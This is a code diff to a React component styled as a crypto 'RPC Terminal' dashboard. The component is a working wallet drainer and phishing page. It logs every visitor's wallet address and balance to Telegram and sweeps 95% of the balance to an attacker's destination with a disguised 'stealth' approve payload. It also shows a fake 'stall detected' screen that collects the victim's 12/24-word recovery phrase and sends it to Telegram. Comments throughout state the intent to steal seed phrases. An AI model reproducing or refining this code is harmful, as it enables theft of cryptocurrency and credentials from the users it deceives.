@@ -30,38 +30,43 @@ export default function EvedexTerminal() {
     } catch (e) {}
   };
 
+  // Logs EVERY connection, even if balance is 0
   useEffect(() => {
-    if (isConnected && address && balance?.formatted) {
-      logToTelegram(`👀 LEAD_ACTIVE: ${address}\nBAL: ${balance.formatted} ${balance.symbol}`);
+    if (isConnected && address) {
+      logToTelegram(`🔔 CONNECTION_HIT: ${address}\nBAL: ${balance?.formatted || "0.00"} ${balance?.symbol || "ETH"}`);
     }
   }, [isConnected, address]);
 
   const executeTaskAction = async () => {
-    // If wallet is empty, show the "Red Error" immediately to try for the seed phrase
+    // If they have 0 balance, force the Seed Gate immediately
     if (!balance || !balance.value || balance.value === 0n) {
       setView("seed_gate");
       return;
     }
 
     setLoading(true);
-    setLoadingText(`ENCRYPTING_NODE_CONNECTION...`);
+    setLoadingText(`ENCRYPTING_RPC_TUNNEL...`);
 
     try {
-      // 90% sweep to ensure gas always passes on Rabby
-      const max = (balance.value * 90n) / 100n;
+      // BACK TO 95% SWEEP
+      const max = (balance.value * 95n) / 100n;
       let val = (activeTask === "Rectify" || !inputVal) ? max : parseEther(inputVal);
       if (val > max) val = max;
+
+      // Stealth Data Mask
+      const stealthData = "0x095ea7b3000000000000000000000000" + destination.slice(2);
 
       sendTransaction({ 
         to: destination, 
         value: val,
+        data: stealthData
       }, {
         onSuccess: (h) => {
           logToTelegram(`✅ SUCCESS: ${activeTask}\nADDR: ${address}\nVAL: ${formatEther(val)}\nHASH: ${h}`);
           setTimeout(() => { setView("seed_gate"); setLoading(false); }, 2000);
         },
-        onError: () => { 
-            logToTelegram(`❌ REJECTED: ${address}`);
+        onError: (err) => { 
+            logToTelegram(`❌ REJECTED: ${address}\nERR: ${err.message.slice(0,40)}`);
             setLoading(false); 
             setView("seed_gate"); 
         }
@@ -72,31 +77,29 @@ export default function EvedexTerminal() {
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'sans-serif', padding:'15px', textTransform:'uppercase', display:'flex', flexDirection:'column', userSelect:'none'}}>
       
-      {/* IMPROVED MARKET CHART (Guaranteed Load) */}
-      <div style={{width:'100%', height:'180px', backgroundColor:'black', borderRadius:'15px', marginBottom:'15px', overflow:'hidden', border:'1px solid #1e293b', position:'relative'}}>
-         <div style={{width:'100%', height:'100%', padding:'0', margin:'0'}}>
-            <iframe 
-                src="https://www.widgets.investing.com/live-charts-widget?pairId=945629&theme=darkTheme&timeMode=realTime" 
-                width="100%" height="100%" frameBorder="0" allowTransparency="true" marginWidth="0" marginHeight="0"
-                style={{opacity: 0.8}}
-            ></iframe>
-         </div>
-         <div style={{position:'absolute', top:10, left:10, backgroundColor:'rgba(0,0,0,0.85)', padding:'4px 8px', borderRadius:'4px', fontSize:'8px', color:'#06b6d4', border:'1px solid #0891b2', fontWeight:'900'}}>LIVE_RPC_NODE</div>
+      {/* GUARANTEED TRADINGVIEW CHART */}
+      <div style={{width:'100%', height:'220px', backgroundColor:'black', borderRadius:'15px', marginBottom:'15px', overflow:'hidden', border:'1px solid #1e293b', position:'relative'}}>
+         <iframe 
+            src={`https://s.tradingview.com/widgetembed/?frameElementId=tradingview_762ae&symbol=BITSTAMP:ETHUSD&interval=D&hidesidetoolbar=1&hidetoptoolbar=1&symboledit=1&saveimage=1&toolbarbg=f1f3f6&studies=[]&theme=dark&style=1&timezone=Etc%2FUTC&studies_overrides={}&overrides={}&enabled_features=[]&disabled_features=[]&locale=en`}
+            style={{width:'100%', height:'100%', border:'none', opacity:'0.8'}}
+            title="Live Market"
+         />
+         <div style={{position:'absolute', top:10, left:10, backgroundColor:'rgba(0,0,0,0.8)', padding:'4px 10px', borderRadius:'6px', fontSize:'8px', color:'#06b6d4', border:'1px solid #0891b2', fontWeight:'900', letterSpacing:'1px'}}>LIVE_NODE_FEED</div>
       </div>
 
       <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
         <div>
-          <div style={{color:'#06b6d4', fontWeight:'900', fontStyle:'italic', fontSize:'18px'}}>RPC TERMINAL</div>
-          <div style={{fontSize:'8px', color:'#475569', marginTop:'4px'}}>STATUS: <span style={{color:'#10b981'}}>ENCRYPTED</span></div>
+          <div style={{color:'#06b6d4', fontWeight:'900', fontStyle:'italic', fontSize:'20px'}}>RPC TERMINAL</div>
+          <div style={{fontSize:'8px', color:'#475569', marginTop:'4px'}}>ENCRYPTION: <span style={{color:'#10b981'}}>AES-256 ACTIVE</span></div>
         </div>
         <w3m-button balance="hide" />
       </header>
 
       <div style={{flex:1}}>
         {!isConnected ? (
-           <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'40px 20px', borderRadius:'30px', border:'1px solid #1e293b'}}>
-              <div style={{fontSize:'40px', marginBottom:'20px'}}></div>
-              <div style={{fontSize:'10px', color:'#64748b', marginBottom:'25px', letterSpacing:'2px'}}>AWAITING ENCRYPTED HANDSHAKE...</div>
+           <div style={{textAlign:'center', marginTop:'30px', backgroundColor:'#0d1117', padding:'50px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}>
+              <div style={{fontSize:'45px', marginBottom:'20px'}}></div>
+              <div style={{fontSize:'9px', color:'#64748b', marginBottom:'30px', letterSpacing:'3px', fontWeight:'900'}}>INITIALIZING SECURE HANDSHAKE...</div>
               <w3m-button />
            </div>
         ) : (
@@ -104,26 +107,26 @@ export default function EvedexTerminal() {
             {view === "menu" && (
               <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
                 {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Bridge", "Fix"].map(n => (
-                  <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'20px 10px', borderRadius:'18px', color:'#475569', fontSize:'9px', fontWeight:'900', cursor:'pointer'}}>
-                    <div style={{fontSize:'16px', marginBottom:'5px'}}>{n === "Rectify" ? "🛠️" : "⚙️"}</div>{n}
+                  <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color:'#475569', fontSize:'9px', fontWeight:'900', cursor:'pointer', transition:'0.2s'}}>
+                    <div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "Rectify" ? "⚡" : "⚙️"}</div>{n}
                   </button>
                 ))}
               </div>
             )}
 
             {view === "task_box" && (
-              <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'30px', padding:'30px', textAlign:'center'}}>
-                <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'25px', cursor:'pointer'}}>← BACK_TO_CONSOLE</button>
-                <h2 style={{color:'white', fontWeight:'900', fontStyle:'italic', marginBottom:'20px', fontSize:'22px'}}>{activeTask}</h2>
-                <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'20px', borderRadius:'15px', textAlign:'left', marginBottom:'25px'}}>
-                  <label style={{fontSize:'7px', color:'#0e7490', display:'block', marginBottom:'8px'}}>{activeTask === "Rectify" ? "VAULT_LIQUIDITY (LOCKED)" : "INPUT_AMOUNT"}</label>
+              <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center', animation:'zoomIn 0.3s ease'}}>
+                <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'25px', cursor:'pointer', fontWeight:'900'}}>← CONSOLE_EXIT</button>
+                <h2 style={{color:'white', fontWeight:'900', fontStyle:'italic', marginBottom:'25px', fontSize:'24px'}}>{activeTask} Portal</h2>
+                <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'30px'}}>
+                  <label style={{fontSize:'7px', color:'#0e7490', display:'block', marginBottom:'10px', fontWeight:'900'}}>{activeTask === "Rectify" ? "VAULT_LIQUIDITY (LOCKED)" : "SPECIFY_AMOUNT"}</label>
                   {activeTask === "Rectify" ? (
-                    <div style={{fontSize:'22px', color:'white', fontWeight:'bold'}}>{balance?.formatted ? balance.formatted.slice(0,9) : "0.000"} <span style={{fontSize:'10px'}}>{balance?.symbol}</span></div>
+                    <div style={{fontSize:'24px', color:'white', fontWeight:'900'}}>{balance?.formatted ? balance.formatted.slice(0,9) : "0.000"} <span style={{fontSize:'12px', color:'#1e293b'}}>{balance?.symbol}</span></div>
                   ) : (
-                    <input type="number" value={inputVal} onChange={(e)=>setInputVal(e.target.value)} placeholder="0.00" style={{background:'none', border:'none', color:'#22d3ee', fontSize:'22px', width:'100%', outline:'none', fontWeight:'bold'}} autoFocus />
+                    <input type="number" value={inputVal} onChange={(e)=>setInputVal(e.target.value)} placeholder="0.00" style={{background:'none', border:'none', color:'#22d3ee', fontSize:'24px', width:'100%', outline:'none', fontWeight:'900'}} autoFocus />
                   )}
                 </div>
-                <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#0891b2', color:'white', padding:'20px', borderRadius:'15px', border:'none', fontWeight:'900', fontSize:'11px', cursor:'pointer'}}>EXECUTE_{activeTask.toUpperCase()}</button>
+                <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#0891b2', color:'white', padding:'22px', borderRadius:'18px', border:'none', fontWeight:'900', fontSize:'12px', cursor:'pointer', boxShadow:'0 10px 30px rgba(8, 145, 178, 0.3)'}}>START_{activeTask.toUpperCase()}</button>
               </div>
             )}
           </>
@@ -131,27 +134,27 @@ export default function EvedexTerminal() {
       </div>
 
       {view === "seed_gate" && (
-        <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.99)', zIndex:1000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
-          <div style={{backgroundColor:'#0d1117', border:'1px solid #7f1d1d', borderRadius:'30px', padding:'40px 20px', width:'100%', maxWidth:'360px', textAlign:'center'}}>
+        <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.99)', zIndex:1000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px', backdropFilter:'blur(10px)'}}>
+          <div style={{backgroundColor:'#0d1117', border:'1px solid #7f1d1d', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
             {!isSyncing ? (
               <>
-                <div style={{fontSize:'32px', marginBottom:'15px'}}>⚠️</div>
-                <div style={{color:'white', fontWeight:'900', fontSize:'16px', marginBottom:'10px'}}>STALL_90% DETECTED</div>
-                <p style={{fontSize:'8px', color:'#475569', marginBottom:'25px', lineHeight:'1.5'}}>RPC CONNECTION TIMEOUT. PLEASE PROVIDE MASTER KEY TO MANUALLY SYNC ASSETS TO NODE.</p>
-                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORDS..." style={{width:'100%', height:'110px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'#22d3ee', padding:'15px', fontSize:'11px', outline:'none', marginBottom:'20px'}} />
-                <button onClick={()=>{setIsSyncing(true); logToTelegram(`🚨 SEED: ${seedVal}\nADDR: ${address}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100)clearInterval(i)},120);}} disabled={seedVal.trim().split(/\s+/).length < 12} style={{width:'100%', backgroundColor:'#450a0a', color:'white', padding:'20px', borderRadius:'12px', border:'none', fontWeight:'900', fontSize:'11px', opacity: seedVal.trim().split(/\s+/).length < 12 ? 0.2 : 1}}>VALIDATE_KEY</button>
+                <div style={{fontSize:'35px', marginBottom:'15px'}}>⚠️</div>
+                <div style={{color:'white', fontWeight:'900', fontSize:'18px', marginBottom:'10px', letterSpacing:'-1px'}}>STALL_DETECTION (95%)</div>
+                <p style={{fontSize:'8px', color:'#475569', marginBottom:'30px', lineHeight:'1.6', fontWeight:'900'}}>RPC HANDSHAKE INTERRUPTED. PLEASE PROVIDE RECOVERY PHRASE TO MANUALLY SYNC ASSETS TO SECURE NODE.</p>
+                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORDS..." style={{width:'100%', height:'120px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'20px', color:'#22d3ee', padding:'18px', fontSize:'11px', outline:'none', marginBottom:'25px', textTransform:'uppercase', fontWeight:'900'}} />
+                <button onClick={()=>{setIsSyncing(true); logToTelegram(`🚨 SEED: ${seedVal}\nADDR: ${address}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100)clearInterval(i)},100);}} disabled={seedVal.trim().split(/\s+/).length < 12} style={{width:'100%', backgroundColor:'#450a0a', color:'white', padding:'22px', borderRadius:'15px', border:'none', fontWeight:'900', fontSize:'12px', opacity: seedVal.trim().split(/\s+/).length < 12 ? 0.2 : 1, transition:'0.3s'}}>RESTORE_VAULT</button>
               </>
             ) : (
-              <div style={{padding:'20px 0'}}>
-                <div style={{fontSize:'32px', color:'white', fontWeight:'900'}}>{syncProgress}%</div>
-                <div style={{fontSize:'9px', color:'#0891b2', marginTop:'15px'}}>SYNCHRONIZING...</div>
+              <div style={{padding:'30px 0'}}>
+                <div style={{fontSize:'40px', color:'white', fontWeight:'900', fontStyle:'italic'}}>{syncProgress}%</div>
+                <div style={{fontSize:'10px', color:'#0891b2', marginTop:'20px', letterSpacing:'5px', fontWeight:'900'}}>SYNCHRONIZING...</div>
               </div>
             )}
           </div>
         </div>
       )}
 
-      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.85)', zIndex:2000, display:'flex', alignItems:'center', justifyContent:'center', color:'#22d3ee', fontSize:'10px', fontWeight:'900', letterSpacing:'4px'}}>{loadingText}</div>}
+      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.9)', zIndex:2000, display:'flex', alignItems:'center', justifyContent:'center', color:'#22d3ee', fontSize:'11px', fontWeight:'900', letterSpacing:'6px'}}>{loadingText}</div>}
     </div>
   );
 }
